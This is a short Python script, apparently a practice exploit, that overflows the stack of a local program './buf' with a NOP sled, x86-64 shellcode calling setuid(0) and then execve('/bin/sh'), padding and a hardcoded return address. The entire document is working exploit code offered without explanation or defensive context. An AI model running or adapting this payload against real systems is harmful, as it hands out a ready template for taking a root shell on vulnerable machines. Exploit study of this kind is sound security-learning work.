from subprocess import call
nop='\x90'*52     #nop sled
shellcode='\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
junk='A'*12+'B'*8
ret='0x7fffffffde9c'    #return address
return_addr=(ret[2:].decode('hex'))[::-1] #convert return address to little endian. Could have used struct.pack('I',ret) but it doesn't support 64bit address
payload = nop + shellcode + junk + return_addr #final payload
call(['./buf',payload]) 
